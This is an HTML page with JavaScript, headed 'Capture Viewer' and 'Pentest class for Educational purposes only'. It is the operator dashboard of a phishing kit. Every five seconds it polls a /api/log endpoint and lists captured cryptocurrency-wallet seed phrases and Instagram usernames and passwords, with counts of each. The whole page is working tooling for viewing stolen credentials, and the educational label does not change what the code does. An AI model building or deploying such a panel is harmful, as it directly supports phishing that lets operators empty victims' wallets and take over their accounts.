<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Viewer — All Data</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            color: #e0e0e0;
            padding: 20px;
            min-height: 100vh;
        }
        h1 { color: #00ff88; font-size: 1.5rem; margin-bottom: 4px; }
        .subtitle { color: #888; font-size: 0.85rem; margin-bottom: 20px; }
        .stats { display: flex; gap: 16px; margin-bottom: 20px; flex-wrap: wrap; }
        .stat-box {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 12px 20px;
        }
        .stat-box .label { font-size: 0.75rem; color: #888; text-transform: uppercase; }
        .stat-box .value { font-size: 1.2rem; color: #00ff88; font-weight: bold; }
        .card {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 12px;
        }
        .card.wallet { border-left: 3px solid #f7931a; }
        .card.instagram { border-left: 3px solid #e4405f; }
        .card.unknown { border-left: 3px solid #888; }
        .card .header {
            display: flex; justify-content: space-between;
            font-size: 0.75rem; color: #666; margin-bottom: 8px;
        }
        .card .badge {
            display: inline-block;
            padding: 2px 8px; border-radius: 4px;
            font-size: 0.7rem; font-weight: bold;
        }
        .badge.wallet { background: #f7931a22; color: #f7931a; }
        .badge.instagram { background: #e4405f22; color: #e4405f; }
        .seed-phrase {
            font-family: 'Courier New', monospace;
            background: #0d0d0d;
            padding: 10px;
            border-radius: 6px;
            word-break: break-all;
            font-size: 0.9rem;
            border: 1px solid #2a2a2a;
        }
        .creds { font-size: 0.9rem; }
        .creds div { margin: 4px 0; }
        .creds .field { color: #888; }
        .creds .value { color: #fff; }
        .error-msg {
            background: #2a1a1a;
            border: 1px solid #5a2a2a;
            color: #ff6b6b;
            padding: 12px;
            border-radius: 8px;
            margin: 12px 0;
        }
        .loading { color: #666; text-align: center; padding: 40px; }
        .refresh-btn {
            background: #00ff88;
            color: #000;
            border: none;
            padding: 8px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .refresh-btn:hover { background: #00cc6a; }
        .no-data { color: #666; text-align: center; padding: 40px; }
        #rawData {
            background: #0d0d0d;
            padding: 10px;
            border-radius: 6px;
            font-family: monospace;
            font-size: 0.8rem;
            white-space: pre-wrap;
            word-break: break-all;
            border: 1px solid #2a2a2a;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <h1>🔍 Capture Viewer(Pentest class for Educational purposes only)</h1>
    <div class="subtitle">Seed phrases AND Instagram credentials — all on one server</div>

    <div class="stats">
        <div class="stat-box">
            <div class="label">Total Captures</div>
            <div class="value" id="totalCount">0</div>
        </div>
        <div class="stat-box">
            <div class="label">Wallet Seed Phrases</div>
            <div class="value" id="walletCount">0</div>
        </div>
        <div class="stat-box">
            <div class="label">Instagram Credentials</div>
            <div class="value" id="instaCount">0</div>
        </div>
    </div>

    <button class="refresh-btn" onclick="fetchData()">🔄 Refresh</button>

    <div id="status"></div>
    <div id="rawData">No raw data</div>
    <div id="entries"></div>

    <script>
        async function fetchData() {
            const statusEl = document.getElementById('status');
            const rawEl = document.getElementById('rawData');
            const entriesEl = document.getElementById('entries');

            statusEl.textContent = 'Loading...';
            statusEl.className = 'loading';

            try {
                const response = await fetch('/api/log');
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                const data = await response.json();

                rawEl.textContent = JSON.stringify(data, null, 2);

                if (!data.entries || data.entries.length === 0) {
                    entriesEl.innerHTML = '<div class="no-data">No entries yet</div>';
                    document.getElementById('totalCount').textContent = '0';
                    document.getElementById('walletCount').textContent = '0';
                    document.getElementById('instaCount').textContent = '0';
                    statusEl.textContent = 'No data captured yet';
                    statusEl.className = '';
                    return;
                }

                const entries = data.entries;
                document.getElementById('totalCount').textContent = entries.length;

                let walletCount = 0;
                let instaCount = 0;
                let html = '';

                // Show newest first
                const reversed = [...entries].reverse();

                for (const entry of reversed) {
                    const time = new Date(entry.timestamp).toLocaleString();

                    // Detect type
                    let type = 'unknown';
                    let displayHtml = '';

                    if (entry.username !== undefined && entry.password !== undefined) {
                        // Instagram credentials
                        type = 'instagram';
                        instaCount++;
                        displayHtml = `
                            <div class="creds">
                                <div><span class="field">Username:</span> <span class="value">${escapeHtml(entry.username || '')}</span></div>
                                <div><span class="field">Password:</span> <span class="value">${escapeHtml(entry.password || '')}</span></div>
                                ${entry.page ? `<div><span class="field">Page:</span> <span class="value">${escapeHtml(entry.page)}</span></div>` : ''}
                            </div>
                        `;
                    } else if (entry.phrase) {
                        // Wallet seed phrase
                        type = 'wallet';
                        walletCount++;
                        displayHtml = `<div class="seed-phrase">${escapeHtml(entry.phrase)}</div>`;
                    } else if (entry.username !== undefined || entry.password !== undefined) {
                        type = 'instagram';
                        instaCount++;
                        displayHtml = `
                            <div class="creds">
                                ${entry.username !== undefined ? `<div><span class="field">Username:</span> <span class="value">${escapeHtml(entry.username)}</span></div>` : ''}
                                ${entry.password !== undefined ? `<div><span class="field">Password:</span> <span class="value">${escapeHtml(entry.password)}</span></div>` : ''}
                            </div>
                        `;
                    } else {
                        displayHtml = `<div class="seed-phrase">${escapeHtml(JSON.stringify(entry))}</div>`;
                    }

                    html += `
                        <div class="card ${type}">
                            <div class="header">
                                <span>${time}</span>
                                <span class="badge ${type}">${type === 'wallet' ? '🔑 Wallet' : type === 'instagram' ? '📸 Instagram' : '❓ Unknown'}</span>
                            </div>
                            ${displayHtml}
                        </div>
                    `;
                }

                document.getElementById('walletCount').textContent = walletCount;
                document.getElementById('instaCount').textContent = instaCount;
                entriesEl.innerHTML = html;
                statusEl.textContent = `Showing ${entries.length} entries (newest first)`;
                statusEl.className = '';

            } catch (err) {
                statusEl.textContent = `Error: ${err.message}`;
                statusEl.className = 'error-msg';
                console.error('Fetch error:', err);
            }
        }

        function escapeHtml(str) {
            if (!str) return '';
            return String(str)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;');
        }

        // Auto-refresh on load
        fetchData();
        // Auto-refresh every 5 seconds
        setInterval(fetchData, 5000);
    </script>
</body>
</html>
